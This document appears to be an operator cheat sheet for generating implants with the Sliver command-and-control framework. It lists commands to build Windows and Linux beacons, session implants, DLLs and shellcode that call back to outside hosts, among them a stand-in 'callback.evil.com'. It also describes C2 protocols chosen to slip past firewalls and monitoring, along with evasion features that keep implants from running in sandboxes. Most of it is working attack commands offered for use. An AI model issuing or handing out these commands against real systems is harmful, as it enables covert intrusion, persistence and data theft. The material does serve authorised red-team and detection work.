
# SLIVER PAYLOAD GENERATION

The `generate` command is used to create Sliver implants. Payloads can be interactive sessions or asynchronous beacons, and can be generated in various formats for different target operating systems.

---

## 1. PAYLOAD TYPES: BEACON VS. SESSION

### Beacon Payloads

Asynchronous, long-haul communication with configurable intervals. Beacons are ideal for maintaining stealthy, long-term persistence.

```bash
# Generate a 64-bit Windows beacon that connects back every 30 seconds
sliver > generate beacon --mtls 10.10.10.5:8443 --reconnect 30 --os windows --arch amd64
```

Use Cases:
* Long-term persistence on sensitive targets.
* Operations in high-security environments with active monitoring.
* Maintaining a low and slow network footprint.

### Session Payloads

Interactive, real-time communication for hands-on-keyboard activity. Sessions provide immediate command execution.
```bash
# Generate an interactive session implant for Linux
sliver > generate --mtls 10.10.10.5:8443 --os linux --arch amd64
```

Use Cases:
* Active exploitation and enumeration phases.
* Interactive command execution and lateral movement.
* Real-time data exfiltration or tool execution.

---

## 2. COMMAND & CONTROL (C2) ENDPOINTS

You MUST specify at least one C2 endpoint when generating an implant. Sliver supports multiple protocols and allows you to stack them for redundancy.

| Protocol | Flag | Description | Use Case |
| -- | -- | -- | -- |
| mTLS | --mtls | Mutual TLS. Encrypted and authenticated C2. The standard and most robust method. | Default C2, best for stable connections. |
| HTTP(S) | --http | Standard HTTP/HTTPS callbacks. Blends in with common web traffic. | Bypassing restrictive outbound firewalls. |
| WireGuard | --wg | Encrypted VPN tunnel using the WireGuard protocol (UDP-based). | Establishing C2 over UDP when TCP is heavily monitored. |
| DNS | --dns | Uses DNS queries for C2 communication (slow but stealthy). | Environments where DNS is always allowed outbound. |
| Named Pipe | --named-pipe | C2 over Windows Named Pipes. | Internal pivoting and lateral movement between processes/hosts. |
| TCP Pivot | --tcp-pivot | Raw TCP connection, used primarily when relaying through a pivot host. | Setting up quick, transient relays. |

Examples of C2 Configuration:

```bash
# Redundant C2: Implant will try mTLS, then fall back to HTTP
sliver > generate --mtls 192.168.1.100:443 --http http://callback.evil.com

# WireGuard C2 (Requires key-exchange and comms ports)
sliver > generate --wg 3.3.3.3:9090 --key-exchange 1337 --tcp-comms 8888

# Stacked C2 example using multiple protocols/domains
sliver > generate --os linux --mtls example.com --dns baz.bishopfox.com
```

---

## 3. PAYLOAD FORMATS & PLATFORMS

The output format is controlled with the --format, --os, and --arch flags.

| Format | --format value | Platform | Use Case |
| -- | -- | -- | -- |
| Executable | exe | Windows/Linux/macOS | Standalone binary (.exe or ELF). **Default format.** |
| Shared Library | shared | Windows/Linux | Library for DLL Sideloading/Hijacking (.dll, .so). |
| Shellcode | shellcode | Windows | Position-independent code for in-memory injection. |
| Service | service | Windows | Executable designed to be run as a Windows service (e.g., via psexec). |

Examples:

```bash
# Generate a 64-bit Windows DLL (shared library)
sliver > generate --mtls 10.10.10.5:443 --os windows --arch amd64 --format shared

# Generate 64-bit Windows shellcode
sliver > generate --mtls 10.10.10.5:443 --os windows --arch amd64 --format shellcode
```

---

## 4. EVASION & TARGETING FEATURES

### DNS Canaries

A unique, non-obfuscated domain embedded in the binary. If a defender runs 'strings' and tries to resolve this domain, the Sliver server will be alerted that the implant has been discovered.

```bash
# Generate a beacon with a canary domain
sliver > generate beacon --mtls 10.10.10.5:443 --canary my-unique-canary.example.com
```

### Execution Limits

Restrict the implant's execution to specific conditions to avoid detonation in sandboxes or unintended environments.

| Flag | Example | Condition |
| -- | -- | -- |
| --limit-hostname | --limit-hostname FINANCE-PC-01 | Only runs if the host matches the specified name. |
| --limit-username | --limit-username Administrator | Only runs for a specific user. |
| --limit-domainjoined | --limit-domainjoined | Only runs on a domain-joined machine. |
| --limit-datetime | --limit-datetime "2025-12-31 23:59:59" | Prevents execution after a set time. |

---

OPERATOR NOTES

*   **Profiles:** Use 'help profiles new' to save complex configurations, making builds safer and easier to reproduce.
*   **Symbol Obfuscation:** Use '--skip-symbols' during generation if you want to disable obfuscation (e.g., for testing or debugging).